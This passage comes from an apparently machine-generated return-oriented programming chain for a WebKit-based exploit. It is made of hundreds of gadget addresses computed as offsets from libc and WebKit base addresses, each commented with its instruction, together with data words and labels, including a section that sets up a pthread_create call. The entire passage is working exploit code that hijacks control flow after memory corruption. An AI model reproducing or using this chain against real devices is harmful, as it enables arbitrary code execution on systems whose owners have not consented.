ropchain+145984, //L2052
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2051:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2050:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2052:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2053:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146104, //L2055
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146088, //L2054
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2054:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2055:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2056:
db([8, 0]); // 0x8
set_gadget(libc_base+788575,); //pop rax
//L2057:
db([8, 0]); // 0x8
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+146304, //L2060
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146272, //L2059
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2059:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2058:
db([32, 0]); // 0x20
set_gadget(libc_base+788575,); //pop rax
//L2060:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146408, //L2062
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146392, //L2061
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2061:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2062:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146520, //L2065
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146488, //L2064
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2064:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2063:
db([48, 0]); // 0x30
set_gadget(libc_base+788575,); //pop rax
//L2065:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+146584, //L2066
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+792472 //pop rcx
]);
//L2066:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+146640, //L2068
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2068:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+146784, //L2071
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+146800, //L2072
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+146768, //L2070
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2070:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2071:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2072:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+146960, //L2076
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+146912, //L2074
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+146944, //L2075
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2074:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2073:
db([48, 0]); // 0x30
set_gadget(libc_base+206806,); //pop rdi
//L2075:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2076:
db([0, 0]); // 0x0
set_gadgets([
libc_base+877546, //shl rax, cl
libc_base+877568, //shr rax, cl
libc_base+793877, //pop rsi
ropchain+147072, //L2077
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147104, //L2079
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147088, //L2078
webkit_base+7438103, //mov [rsi], rax
libc_base+792472 //pop rcx
]);
//L2077:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2078:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2079:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147200, //L2080
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147216, //L2081
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2080:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2081:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147328, //L2082
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147312, //L2083
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2083:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2082:
db([0, 0]); // 0x0
set_gadgets([
libc_base+793877, //pop rsi
ropchain+147416, //L2085
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+793877, //pop rsi
ropchain+147400, //L2084
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2084:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2085:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147512, //L2086
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147528, //L2087
webkit_base+7438103, //mov [rsi], rax
webkit_base+432898 //pop r8
]);
//L2086:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2087:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147640, //L2088
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+147624, //L2089
webkit_base+7438103, //mov [rsi], rax
libc_base+788575 //pop rax
]);
//L2089:
db([0, 0]); // 0x0
set_gadget(libc_base+811575,); //pop rsp
//L2088:
db([0, 0]); // 0x0
//_pthread_create__rop:
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+147712, //L2091
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2091:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147776, //L2093
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
webkit_base+432898 //pop r8
]);
//L2093:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([24, 0]); // 0x18
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147896, //L2094
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+147880, //L2096
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2096:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2094:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2095:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2097:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148024, //L2099
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148008, //L2098
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2098:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2099:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2100:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2101:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2102:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2103:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2104:
db([4096, 0]); // 0x1000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148336, //L2106
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2106:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2108:
db([1, 0]); // 0x1
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2109:
db([2, 0]); // 0x2
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+148528, //L2111
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2111:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+148640, //L2114
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2114:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2113:
db([65536, 0]); // 0x10000
set_gadget(libc_base+206806,); //pop rdi
//L2115:
db([65536, 0]); // 0x10000
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+148768, //L2117
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+148752, //L2116
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2116:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2117:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575 //pop rax
]);
//L2118:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+788575, //pop rax
//L2120:
ropchain+148920, //L2119
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+811575, //pop rsp
ropchain+158912, //L2121
//L2119:
libc_base+882884, //mov rax, rcx
libc_base+793877 //pop rsi
]);
db([4294967248, 4294967295]); // -0x30
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877 //pop rsi
]);
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149016, //L2122
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2122:
db([0, 0]); // 0x0
set_gadgets([
libc_base+471355, //mov [rdi], rax
libc_base+793877, //pop rsi
ropchain+149072, //L2124
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2124:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2126:
db([65536, 0]); // 0x10000
set_gadget(libc_base+788575,); //pop rax
//L2127:
db([65536, 0]); // 0x10000
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+149224, //L2128
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2128:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+149280, //L2130
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2130:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+793877, //pop rsi
ropchain+149352, //L2132
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2132:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2134:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+2997875, //mov [rax], rcx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2135:
db([312, 0]); // 0x138
set_gadget(libc_base+793877,); //pop rsi
//L2137:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2139:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+149568, //L2142
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149552, //L2140
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2140:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2142:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+149736, //L2145
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+149752, //L2146
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+149720, //L2143
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+149704, //L2144
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2144:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2143:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2145:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2146:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+149848, //L2148
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+149832, //L2147
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2147:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2148:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2149:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2150:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+877175, //sub rax, rcx ; sbb rdx, rcx
libc_base+793877, //pop rsi
ropchain+150064, //L2152
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150080, //L2153
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150048, //L2151
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2151:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2152:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2153:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150168, //L2154
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150200, //L2157
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2154:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2156:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2157:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2159:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+150344, //L2162
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150328, //L2160
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2160:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2162:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+150512, //L2165
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150528, //L2166
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150496, //L2163
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+150480, //L2164
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2164:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2163:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2165:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2166:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150624, //L2168
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+150608, //L2167
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2167:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2168:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2169:
db([15, 0]); // 0xf
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877, //pop rsi
ropchain+150736, //L2171
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2171:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+75236, //or rax, rcx
libc_base+793877, //pop rsi
ropchain+150880, //L2174
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+150896, //L2175
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+150864, //L2173
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2173:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2174:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2175:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+150984, //L2176
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151016, //L2179
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2176:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2178:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2179:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+793877 //pop rsi
]);
//L2181:
db([4294967284, 4294967295]); // -0xc
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151160, //L2184
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151144, //L2182
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2182:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2184:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191169, //mov eax, [rdi]
libc_base+793877, //pop rsi
ropchain+151328, //L2187
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151344, //L2188
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151312, //L2185
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+793877, //pop rsi
ropchain+151296, //L2186
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2186:
db([0, 0]); // 0x0
set_gadget(libc_base+792472,); //pop rcx
//L2185:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2187:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2188:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151440, //L2190
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151424, //L2189
webkit_base+7438103, //mov [rsi], rax
libc_base+206806 //pop rdi
]);
//L2189:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2190:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
db([8, 0]); // 0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
libc_base+471355, //mov [rdi], rax
libc_base+792472 //pop rcx
]);
//L2191:
db([1, 0]); // 0x1
set_gadget(libc_base+788575,); //pop rax
//L2192:
db([1, 0]); // 0x1
set_gadgets([
libc_base+191168, //mov rax, [rdi]
libc_base+793877 //pop rsi
]);
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+248252, //sub rdi, rsi ; mov rdx, rdi
webkit_base+1838146, //add rax, rcx
libc_base+793877, //pop rsi
ropchain+151656, //L2194
webkit_base+7438103, //mov [rsi], rax
libc_base+793877, //pop rsi
ropchain+151672, //L2195
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151640, //L2193
webkit_base+7438103, //mov [rsi], rax
webkit_base+3750700 //pop r11 ; mov rax, rdi
]);
//L2193:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2194:
db([0, 0]); // 0x0
set_gadget(libc_base+788575,); //pop rax
//L2195:
db([0, 0]); // 0x0
set_gadgets([
webkit_base+6227286, //movsxd rax, edi
libc_base+793877, //pop rsi
ropchain+151760, //L2196
webkit_base+7438103, //mov [rsi], rax
webkit_base+1786005, //mov rax, r11
libc_base+793877, //pop rsi
ropchain+151792, //L2199
webkit_base+7438103, //mov [rsi], rax
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2196:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2198:
db([4294967284, 4294967295]); // -0xc
set_gadget(libc_base+206806,); //pop rdi
//L2199:
db([0, 0]); // 0x0
set_gadgets([
libc_base+547636, //add rax, rsi
webkit_base+954100, //mov [rax], ecx
libc_base+759626, //mov rax, r8
libc_base+792472 //pop rcx
]);
//L2200:
db([0, 0]); // 0x0
set_gadget(libc_base+793877,); //pop rsi
//L2202:
db([4294967288, 4294967295]); // -0x8
set_gadgets([
libc_base+547636, //add rax, rsi
libc_base+793877, //pop rsi
ropchain+151952, //L2205
webkit_base+7438103, //mov [rsi], rax
libc_base+50775, //mov rax, rdi
libc_base+793877, //pop rsi
ropchain+151936, //L2203
webkit_base+7438103, //mov [rsi], rax
libc_base+882884, //mov rax, rcx
libc_base+792472 //pop rcx
]);
//L2203:
db([0, 0]); // 0x0
set_gadget(libc_base+206806,); //pop rdi
//L2205:
db([0, 0]); // 0x0
set_gadgets([
libc_base+191168, //mov rax, [rdi]
